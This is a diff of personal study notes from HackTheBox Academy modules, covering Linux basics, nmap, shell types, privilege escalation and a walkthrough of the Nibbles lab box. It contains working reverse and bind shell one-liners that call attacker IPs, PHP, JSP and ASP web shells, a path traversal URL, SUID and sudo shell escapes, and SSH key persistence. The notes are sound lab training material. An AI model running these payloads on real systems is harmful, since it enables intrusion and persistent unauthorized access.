@@ -1,12 +1,3 @@
----
-title: HackTheBox Academy
-author: Mateus Marques
-output:
- html_document:
-  highlight: tango
-urlcolor: magenta
----
-
 ## 1. Linux Fundamentals
 
 ### Basics
@@ -34,12 +25,12 @@ The command `uname -r` can be useful, because we can search for a kernel specifi
 
 
 Connect to VPN (`sudo` is necessary):
-```{bash eval=F}
+```bash
 sudo openvpn academy-regular.ovpn
 ```
 
 To connect via SSH:
-```{bash eval=F}
+```bash
 ssh <user>@<IP address>
 ```
 
@@ -56,7 +47,7 @@ Commands for file searching: `which, find, locate`.
 
 
 What is the name of the config file that has been created after `2020-03-03` and is smaller than `28k` but larger than `25k`?
-```{bash eval=F}
+```bash
 find / -type f -name *.conf -size +25k -size -28k -exec ls -la {} \; 2>/dev/null
 ```
 
@@ -66,14 +57,14 @@ If we try to use the argument `-newerBt 2020-03-03` we get
 
 
 How many files exist on the system that have the `.bak` extension?
-```{bash eval=F}
+```bash
 find / -type f -name *.bak 2>/dev/null | wc -l
 ```
 
 
 
 File descriptors are `STDIN - 0`, `STDOUT - 1`, `STDERR - 2`. We can redirect erros and output with `>`. The `<` character serves as standard input. To append text to a file, we use `>>`. The `<< FINISH` serves to enter standard input through a stream until we type `"FINISH"` to define the input's end. Usually we use `EOF` instead of `FINISH`, but it can be any word. The pipe `|` is for redirecting standard output to standard input for the next command.
-```{bash eval=F}
+```bash
 find /etc -name shadow 2>/dev/null > results.txt
 find /etc -name shadow 2>stderr.txt 1>stdout.txt
 cat < input.txt
@@ -82,7 +73,7 @@ write something
 ...
 EOF
 ```
-```{bash eval=F}
+```bash
 find /etc -name *.conf 2>/dev/null | grep systemd | wc -l
 ```
 
@@ -93,27 +84,27 @@ Pagers are `more` and `less`. Command `head` for the first lines of input, `tail
 
 
 To filter lines we use `grep`. The option `-v` is to exclude the filtered results.
-```{bash eval=F}
+```bash
 cat /etc/passwd | grep -v "false\|nologin"
 ```
 
 The `cut` command is to remove specific delimiters and show the words in a specified position. The option `-d` is for the delimiter and `-f` for the position.
-```{bash eval=F}
+```bash
 cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
 ```
 
 In the next example, we replace the colon character with space using `tr`.
-```{bash eval=F}
+```bash
 cat /etc/passwd | grep -v "false\|nologin" | tr ":" " "
 ```
 
 The tool `column` is to display in a tabular form.
-```{bash eval=F}
+```bash
 cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | column -t
 ```
 
 Of course, `sed` and `awk` need no introduction.
-```{bash eval=F}
+```bash
 cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " |
 awk '{print $1, $NF}' | sed 's/bin/HTB/g'
 ```
@@ -125,7 +116,7 @@ Counting lines with `wc -l`.
 How many services are listening on the target system on all interfaces? (Not on localhost and IPv4 only)
 
 The file `/etc/services` is a table for the internet services, port numbers and protocol types. "Every networking program should look into this file to get the port number (and protocol) for its service". But this file does not tell us about the active running services.
-```{bash eval=F}
+```bash
 ss -Hl -4 | grep "LISTEN" | grep -v "127\.0\.0" | wc -l
 ```
 
@@ -134,20 +125,20 @@ The command `ss` dumps socket (network services) statistics.
 
 
 Determine what user the ProFTPd server is running under. Submit the username as the answer.
-```{bash eval=F}
+```bash
 ps aux | grep -i "proftpd"
 ```
 
 
 
 Use cURL from your Pwnbox (not the target machine) to obtain the source code of the [https://www.inlanefreight.com](https://www.inlanefreight.com) website and filter all unique paths of that domain. Submit the number of these paths as the answer.
-```{bash eval=F}
+```bash
 curl -L "https://www.inlanefreight.com" > site.html
 grep -o "https\?://www\.inlanefreight\.com[^\"']*" site.html |
 sort | uniq | wc -l
 ```
 
-```{bash eval=F}
+```bash
 curl -L "https://www.inlanefreight.com" > site.html
 grep -o "https\?://www\.inlanefreight\.com[^\"']*" site.html |
 sort | uniq | wc -l
@@ -163,13 +154,13 @@ Besides assigning direct user and group permissions, we can also configure speci
 If the administrator sets the SUID bit to `journalctl`, any user with access to this application could execute a shell as root. This is because it invokes the pager `less`, that can execute arbitrary code.
 
 It can be used to break out from restricted environments by spawning an interactive system shell.
-```{bash eval=F}
+```bash
 journalctl
 !/bin/sh
 ```
 
 If the `journalctl` is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
-```{bash eval=F}
+```bash
 sudo journalctl
 !/bin/sh
 ```
@@ -179,11 +170,11 @@ sudo journalctl
 ### Scheduling tasks
 
 Create a timer with `systemd`.
-```{bash eval=F}
+```bash
 sudo mkdir /etc/systemd/system/mytimer.timer.d
 sudo vim /etc/systemd/system/mytimer.timer
 ```
-```{txt eval=F}
+```txt
 [Unit]
 Description=My Timer
 
@@ -196,10 +187,10 @@ WantedBy=timers.target
 ```
 
 Now create a service.
-```{bash eval=F}
+```bash
 sudo vim /etc/systemd/system/mytimer.service
 ```
-```{txt eval=F}
+```txt
 [Unit]
 Description=My Service
 
@@ -209,17 +200,17 @@ ExecStart=/full/path/to/my/script.sh
 [Install]
 WantedBy=multi-user.target
 ```
-```{bash eval=F}
+```bash
 sudo systemctl daemon-reload
 sudo systemctl start mytimer.service
 sudo systemctl enable mytimer.service
 ```
 
 Crontab example:
-```{bash eval=F}
+```bash
 crontab -l
 ```
-```{bash eval=F}
+```bash
 # System Update (every six hours)
 * */6 * * /path/to/update_software.sh
 
@@ -244,7 +235,7 @@ crontab -l
 
 For Apache2, to specify which folders can be accessed, we can edit the file /etc/apache2/apache2.conf with a text editor. This file contains the global settings. We can change the settings to specify which directories can be accessed and what actions can be performed on those directories.
 
-```{txt eval=F}
+```txt
 <Directory /var/www/html>
         Options Indexes FollowSymLinks
         AllowOverride All
@@ -255,14 +246,14 @@ For Apache2, to specify which folders can be accessed, we can edit the file /etc
 It is also possible to customize individual settings at the directory level by using the `.htaccess file`, which we can create in the directory in question. This file allows us to configure certain directory-level settings, such as access controls, without having to customize the Apache configuration file. We can also add modules to get features like `mod_rewrite`, `mod_security`, and `mod_ssl` that help us improve the security of our web application.
 
 Python Web Server is a simple, fast alternative to Apache and can be used to host a single folder with a single command to transfer files to another system.
-```{bash eval=F}
+```bash
 python3 -m http.server
 ```
 
 * Virtual Private Network (VPN) is a technology that allows us to connect securely to another network as if we were directly in it. This is done by creating an encrypted tunnel connection between the client and the server, which means that all data transmitted over this connection is encrypted.
 
 To create a `apache` simple server:
-```{bash eval=F}
+```bash
 sudo pacman -S apache
 systemctl start http
 ```
@@ -276,24 +267,24 @@ An alternative to curl is the tool wget. With this tool, we can download files f
 ### Backup and Restore
 
 Rsync - Backup a local directory to a backup-server:
-```{bash eval=F}
+```bash
 rsync -av /path/to/mydirectory user@backup_server:/path/to/backup/directory
 ```
 
 Rsync - Restore backup:
-```{bash eval=F}
+```bash
 rsync -av user@remote_host:/path/to/backup/directory /path/to/mydirectory
 ```
 
 Secure transfer of backup:
-```{bash eval=F}
+```bash
 rsync -avz -e ssh /path/to/mydirectory user@backup_server:/path/to/backup/directory
 ```
 
 ### File management
 
 We can use the lsof command to list the open files on the file system.
-```{bash eval=F}
+```bash
 lsof | grep "user"
 ```
 
@@ -302,7 +293,7 @@ If we find any processes that are using the file system, we need to stop them be
 ### Containerization
 
 Creating a Docker image is done by creating a Dockerfile, which contains all the instructions the Docker engine needs to create the container. We can use Docker containers as our “file hosting” server when transferring specific files to our target systems. Therefore, we must create a Dockerfile based on Ubuntu 22.04 with Apache and SSH server running. With this, we can use `scp` to transfer files to the docker image, and Apache allows us to host files and use tools like `curl`, `wget`, and others on the target system to download the required files. Such a Dockerfile could look like the following:
-```{bash eval=F}
+```bash
 # Use the latest Ubuntu 22.04 LTS as the base image
 FROM ubuntu:22.04
 
@@ -334,12 +325,12 @@ CMD service ssh start && /usr/sbin/apache2ctl -D FOREGROUND
 ```
 
 Docker Build:
-```{bash eval=F}
+```bash
 docker build -t FS_docker .
 ```
 
 Docker Run:
-```{bash eval=F}
+```bash
 # docker run -p <host port>:<docker port> -d <docker container name>
 docker run -p 8022:22 -p 8080:80 -d FS_docker
 ```
@@ -366,10 +357,10 @@ We can also use them to test exploits or malware in a controlled environment whe
 * Keeping the container up to date
 
 Let us limit the resources to the container. In order to configure `cgroups` for LXC and limit the CPU and memory, a container can create a new configuration file with the name of our container:
-```{bash eval=F}
+```bash
 sudo vim /usr/share/lxc/config/linuxcontainer.conf
 ```
-```{bash eval=F}
+```bash
 lxc.cgroup.cpu.shares = 512     # 512/1024 = half of host's CPU time
 lxc.cgroup.memory.limit_in_bytes = 512M     # 512Mb of RAM available to the container
 ```
@@ -377,23 +368,23 @@ lxc.cgroup.memory.limit_in_bytes = 512M     # 512Mb of RAM available to the cont
 ### Network Configuration
 
 Activate Network Interface
-```{bash eval=F}
+```bash
 sudo ifconfig eth0 up     # OR
 sudo ip link set eth0 up
 ```
 
 Assign IP Address to an Interface
-```{bash eval=F}
+```bash
 sudo ifconfig eth0 192.168.1.2
 ```
 
 Assign a Netmask to an Interface
-```{bash eval=F}
+```bash
 sudo ifconfig eth0 netmask 255.255.255.0
 ```
 
 Assign the Route to an Interface
-```{bash eval=F}
+```bash
 sudo route add default gw 192.168.1.1 eth0
 ```
 
@@ -407,12 +398,12 @@ When a desktop is started on a Linux computer, the communication of the graphica
 
 For this, we have to allow X11 forwarding in the SSH configuration file (/etc/ssh/sshd_config) on the server that provides the application by changing this option to yes.
 
-```{bash eval=F}
+```bash
 cat /etc/ssh/sshd_config | grep X11Forwarding
 ```
 
 With this we can start the application from our client with the following command:
-```{bash eval=F}
+```bash
 ssh -X htb-student@10.129.23.11 /usr/bin/firefox
 ```
 
@@ -476,12 +467,12 @@ The `-P` options to nmap specify which "ping" methods it should use to see if a 
 Look at `-sS`. It says it performs a stealthy scan.
 
 Example:
-```{bash eval=F}
+```bash
 nmap -A -T4 -sV "10.129.15.46"
 ```
 
 Very fast scan:
-```{bash eval=F}
+```bash
 nmap -T5 -A -p- --min-rate=500 10.129.44.239
 ```
 
@@ -491,7 +482,7 @@ Option `--open` prints only open ports.
 We can check which ports nmap scans for a given scan type by running a scan with no target specified, using the command `nmap -v -oG -`. Here we will output the greppable format to stdout with `-oG -` and `-v` for verbose output.
 
 Option `-oA <basename>` outputs in various formats at once. It is useful to gather a lot of details.
-```{bash eval=F}
+```bash
 nmap -sV --open -oA nibbles_initial_scan 10.129.42.190
 ls
 nibbles_initial_scan.gnmap  nibbles_initial_scan.nmap  nibbles_initial_scan.xml
@@ -505,7 +496,7 @@ CIA triad: Confidentiality, integrity, and availability.
 Typing `netstat -rn` will show us the networks accessible via the VPN.
 
 There are three main types of shell connections:
-```{txt eval=F}
+```txt
 Reverse shell 	Initiates a connection back to a "listener" on our attack box.
 Bind shell 	    "Binds" to a specific port on the target host and waits for a connection from our
                 attack box.
@@ -519,7 +510,7 @@ TCP is connection-oriented, meaning that a connection between a client and a ser
 UDP utilizes a connectionless communication model. There is no "handshake" and therefore introduces a certain amount of unreliability since there is no guarantee of data delivery. UDP is useful when error correction/checking is either not needed or is handled by the application itself. UDP is suitable for applications that run time-sensitive tasks since dropping packets is faster than waiting for delayed packets due to retransmission, as is the case with TCP and can significantly affect a real-time system. There are 65,535 TCP ports and 65,535 different UDP ports, each denoted by a number. Some of the most well-known TCP and UDP ports are listed below:
 
 Banner grabbing with `netcat`:
-```{bash eval=F}
+```bash
 nc <ip_address> <port>
 ```
 
@@ -538,7 +529,7 @@ Target: `94.237.62.195:39921`
 Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)
 
 If we go to `http://94.237.62.195:39921`, we see a WordPress website and some description of a "Simple Backup Plugin 2.7.10".
-```{bash eval=F}
+```bash
 Simple Backup Plugin 2.7.10 for WordPress can backup and download your WordPress website and MySQL
 Database. Plugin can also optionally perform many common optimizations to wordpress and MySQL
 Database before backup. This plugin will create a directory in the root of your WordPress directory
@@ -546,11 +537,11 @@ called ‘simple-backup’ to store the backup files. If the plugin can not...
 ```
 
 We then go to Metasploit to search for an exploit associated with this Simple Backup Plugin.
-```{bash eval=F}
+```bash
 msfconsole
 msf6 > search exploit simple backup
 ```
-```{bash eval=F}
+```bash
 Matching Modules
 ================
 
@@ -558,11 +549,11 @@ Matching Modules
    -  ----                         ----    -----  -----------
    0  wp_simple_backup_file_read   normal  No     WordPress Simple Backup File Read Vulnerability
 ```
-```{bash eval=F}
+```bash
 msf6 > use 0
 msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > show options
 ```
-```{bash eval=F}
+```bash
 Module options (auxiliary/scanner/http/wp_simple_backup_file_read):
 
    Name       Current Setting  Required  Description
@@ -575,7 +566,7 @@ Module options (auxiliary/scanner/http/wp_simple_backup_file_read):
    THREADS    1                yes       The number of concurrent threads (max one per host)
    VHOST                       no        HTTP server virtual host
 ```
-```{bash eval=F}
+```bash
 msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set FILEPATH flag.txt
 msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RHOSTS 94.237.62.195
 msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RPORT 39921
@@ -591,7 +582,7 @@ The loot file contains the flag `HTB{my_f1r57_h4ck}`.
 
 Another way of getting the flag is by reading the exploit description at [exploitdb/39883](https://www.exploit-db.com/exploits/39883).
 Reading the "File Download" section, we see that we can download our flag by going to the page
-```{txt eval=F}
+```txt
 http://94.237.62.195:39921/wp-admin/tools.php?page=backup_manager&download_backup_file=../../../../flag.txt
 ```
 
@@ -605,7 +596,7 @@ Googling a little bit, I was also able to find the plugin's source code at [wp-p
 A Reverse Shell is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a netcat listener on our machine that listens on a specific port, say port 1234. With this listener in place, we can execute a reverse shell command that connects the remote systems shell, i.e., Bash or PowerShell to our netcat listener, which gives us a reverse connection over the remote system.
 
 The first step is to start a netcat listener on a port of our choosing:
-```{bash eval=F}
+```bash
 nc -lvnp 1234
 ```
 
@@ -614,11 +605,11 @@ However, first, we need to find our system's IP to send a reverse connection bac
 The command we execute depends on what operating system the compromised host runs on, i.e., Linux or Windows, and what applications and commands we can access. The [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) page has a comprehensive list of reverse shell commands we can use that cover a wide range of options depending on our compromised host.
 
 The below commands are reliable commands we can use to get a reverse connection, for bash on Linux compromised hosts and Powershell on Windows compromised hosts:
-```{bash eval=F}
+```bash
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 ```
-```{powershell eval=F}
+```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 
@@ -627,18 +618,18 @@ A Reverse Shell is handy when we want to get a quick, reliable connection to our
 #### Bind Shell
 
 Once again, we can utilize [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) to find a proper command to start our bind shell. We will start a listening connection on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere. The following are reliable commands we can use to start a bind shell:
-```{bash eval=F}
+```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
 ```
-```{python eval=F}
+```python
 python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
 ```
-```{powershell eval=F}
+```powershell
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
 ```
 
 Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it. We can use netcat to connect to that port and get a connection to the shell:
-```{bash eval=F}
+```bash
 nc 10.10.10.1 1234
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -647,7 +638,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.
 
 There are multiple methods to do this. For our purposes, we will use the python/stty method. In our netcat shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:
-```{bash eval=F}
+```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
@@ -658,20 +649,20 @@ Check later the [Upgrading TTY](https://academy.hackthebox.com/module/77/section
 The final type of shell we have is a Web Shell. A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.
 
 First of all, we need to write our web shell that would take our command through a GET request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:
-```{php eval=F}
+```php
 <?php system($_REQUEST["cmd"]); ?>
 ```
-```{jsp eval=F}
+```jsp
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
-```{asp eval=F}
+```asp
 <% eval request("cmd") %>
 ```
 
 Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. shell.php and upload it, and then access our uploaded file to execute commands.
 
 However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:
-```{bash eval=F}
+```bash
 Apache 	/var/www/html/
 Nginx 	/usr/local/nginx/html/
 IIS 	c:\inetpub\wwwroot\
@@ -679,12 +670,12 @@ XAMPP 	C:\xampp\htdocs\
 ```
 
 For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:
-```{bash eval=F}
+```bash
 echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 ```
 
 Once we write our web shell, we can either access it through a browser or by using cURL. We can visit the shell.php page on the compromised website, and use ?cmd=id to execute the id command. Another option is to use cURL:
-```{bash eval=F}
+```bash
 curl http://SERVER_IP:PORT/shell.php?cmd=id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -737,7 +728,7 @@ We may also check for Password Reuse, as the system user may have used their pas
 #### SSH Keys
 
 Finally, let us discuss SSH keys. If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:
-```{bash eval=F}
+```bash
 vim id_rsa
 chmod 600 id_rsa
 ssh root@10.10.10.10 -i id_rsa
@@ -746,10 +737,10 @@ root@remotehost#
 Note that we used the command `chmod 600 id_rsa` on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.
 
 If we find ourselves with write access to a users `.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:
-```{bash eval=F}
+```bash
 ssh-keygen -f key
 ```
-```{txt eval=F}
+```txt
 Generating public/private rsa key pair.
 Enter passphrase (empty for no passphrase): *******
 Enter same passphrase again: *******
@@ -767,12 +758,12 @@ The key's randomart image is:
 ```
 
 This will give us two files: key (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:
-```{bash eval=F}
+```bash
 user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
 ```
 
 Now, the remote server should allow us to log in as that user by using our private key:
-```{bash eval=F}
+```bash
 ssh root@10.10.10.10 -i key
 root@remotehost#
 ```
@@ -782,38 +773,38 @@ root@remotehost#
 There are many methods to accomplish this. One method is running a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host.
 
 Another method to transfer files would be using SCP (Secure Copy Protocol), granted we have obtained ssh user credentials on the remote host. We can do so as follows:
-```{bash eval=F}
+```bash
 scp linenum.sh user@remotehost:/tmp/linenum.sh
 ```
-```{txt eval=F}
+```txt
 user@remotehost's password: *********
 ```
 
 In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to `base64` encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:
-```{bash eval=F}
+```bash
 base64 shell -w 0
 f0VMRgIBAQAAAAAAAAA... <SNIP> ...gAU0iJ51JXSInmDwU
 ```
 
 Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:
-```{bash eval=F}
+```bash
 user@remotehost$ echo "f0VMRgIBAQAAAAAAAAA... <SNIP> ...gAU0iJ51JXSInmDwU" | base64 -d > shell
 ```
 
 To validate the format of a file, we can run the `file` command on it:
-```{bash eval=F}
+```bash
 file shell
 shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
 ```
 
 As we can see, when we run the file command on the shell file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:
-```{bash eval=F}
+```bash
 md5sum shell
 321de1d7e7c3735838890a72c9ae7d1d shell
 ```
 
 Now, we can go to the remote server and run the same command on the file we transferred:
-```{bash eval=F}
+```bash
 user@remotehost$ md5sum shell
 321de1d7e7c3735838890a72c9ae7d1d shell
 ```
@@ -822,7 +813,7 @@ As we can see, both files have the same md5 hash, meaning the file was transferr
 
 ### Resources recommended by HTB
 
-```{txt eval=F}
+```txt
 OWASP Juice Shop 	Is a modern vulnerable web application written in Node.js, Express, and Angular which
                     showcases the entire OWASP Top Ten along with many other real-world application
                     security flaws.
@@ -847,17 +838,17 @@ The [Dante Pro Lab](https://app.hackthebox.com/prolabs/overview/dante) is the mo
 ### Nibbles
 
 We can use `whatweb` to try to identify the web application in use.
-```{bash eval=F}
+```bash
 whatweb 10.129.42.190
 http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ],
 HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
 ```
 
 A quick Google search for "nibbleblog exploit" yields this Nibblblog File Upload Vulnerability. The flaw allows an authenticated attacker to upload and execute arbitrary PHP code on the underlying web server. The Metasploit module in question works for version 4.0.3. We do not know the exact version of Nibbleblog in use yet, but it is a good bet that it is vulnerable to this.
-```{bash eval=F}
+```bash
 gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
 ```
-```{bash eval=F}
+```bash
 /.hta (Status: 403)
 /.htaccess (Status: 403)
 /.htpasswd (Status: 403)
@@ -870,10 +861,10 @@ gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/word
 /README (Status: 200)
 /themes (Status: 301)
 ```
-```{bash eval=F}
+```bash
 curl http://10.129.42.190/nibbleblog/README
 ```
-```{bash eval=F}
+```bash
 ====== Nibbleblog ======
 Version: v4.0.3
 Codename: Coffee
@@ -884,7 +875,7 @@ Release date: 2014-04-01
 The HTTP code `301` means a permanent redirect. But that does not mean fail! We can check each of these.
 
 Browsing to `nibbleblog/content` shows some interesting subdirectories `public`, `private`, and `tmp`. Digging around for a while, we find a `users.xml` file which at least seems to confirm the username is indeed admin. It also shows blacklisted IP addresses. We can request this file with `cURL` and prettify the XML output using `xmllint`.
-```{bash eval=F}
+```bash
 curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
 ```
 
@@ -899,7 +890,7 @@ Up to this point, have the following pieces of the puzzle:
 * Login brute-forcing protection blacklists our IP address after too many invalid login attempts. This takes login brute-forcing with a tool such as Hydra off the table.
 
 Taking another look through all of the exposed directories, we find a `config.xml` file.
-```{bash eval=F}
+```bash
 curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
 ```
 Checking it, hoping for passwords proofs fruitless, but we do see two mentions of nibbles in the site title as well as the notification e-mail address. This is also the name of the box. Could this be the admin password? `Yes`.
@@ -907,19 +898,19 @@ Checking it, hoping for passwords proofs fruitless, but we do see two mentions o
 When performing password cracking offline with a tool such as `Hashcat` or attempting to guess a password, it is important to consider all of the information in front of us. It is not uncommon to successfully crack a password hash (such as a company's wireless network passphrase) using a wordlist generated by crawling their website using a tool such as [CeWL](https://github.com/digininja/CeWL).
 
 Now that we are logged in to the admin portal, we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver. Looking around a bit, we see the following page:
-```{txt eval=F}
+```txt
 Plugins 	Allows us to configure, install, or uninstall plugins. The "My image" plugin allows us to upload
             an image file. Could this be abused to upload PHP code potentially?
 ```
 
 Let us attempt to use this plugin to upload a snippet of PHP code instead of an image. The following snippet can be used to test for code execution.
-```{php eval=F}
+```php
 <?php system('id'); ?>
 <?php system('sudo bash'); ?>
 ```
 
 Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the `/content` directory. Under this, there is a plugins directory and another subdirectory for `my_image`. The full path is at `http://<host>/nibbleblog/content/private/plugins/my_image/`. In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful! Let us check and see if we have command execution.
-```{bash eval=F}
+```bash
 curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
 uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 ```
@@ -927,19 +918,19 @@ uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 Let us edit our local PHP file and upload it again. This command should get us a reverse shell. As mentioned earlier in the Module, there are many reverse shell cheat sheets out there. Some great ones are [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).
 
 Let us use the following Bash reverse shell one-liner and add it to our PHP script.
-```{bash eval=F}
+```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
 ```
 
 We will add our `tun0` VPN IP address in the `<ATTACKING IP>` placeholder and a port of our choice for `<LISTENING PORT>` to catch the reverse shell on our `netcat` listener. See the edited `PHP` script below.
-```{php eval=F}
+```php
 <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
 ```
 
 We upload the file again and start a `netcat` listener in our terminal:
 
 `cURL` the image page again or browse to it in Firefox at `http://nibbleblog/content/private/plugins/my_image/image.php` to execute the reverse shell.
-```{bash eval=F}
+```bash
 nc -lvnp 9443
 listening on [any] 9443 ...
 connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
@@ -949,7 +940,7 @@ uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 ```
 
 Furthermore, we have a reverse shell. Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as `su` will not work, we cannot use text editors, tab-completion does not work, etc. This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) explains the issue further as well as a variety of ways to upgrade to a fully interactive TTY. For our purposes, we will use a `Python` one-liner to spawn a pseudo-terminal so commands such as `su` and `sudo` work as discussed previously in this Module.
-```{bash eval=F}
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 Try the various techniques for upgrading to a full TTY and pick one that works best for you.
@@ -959,7 +950,7 @@ Browsing to `/home/nibbler`, we find the `user.txt` flag as well as a zip file `
 Let's pull in `LinEnum.sh` to perform some automated privilege escalation checks. First, download the script to your local attack VM or the Pwnbox and then start a Python HTTP server using the command `sudo python3 -m http.server 8080`.
 
 The `nibbler` user can run the file `/home/nibbler/personal/stuff/monitor.sh` with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user. Let us edit the `monitor.sh` file to append a reverse shell one-liner.
-```{bash eval=F}
+```bash
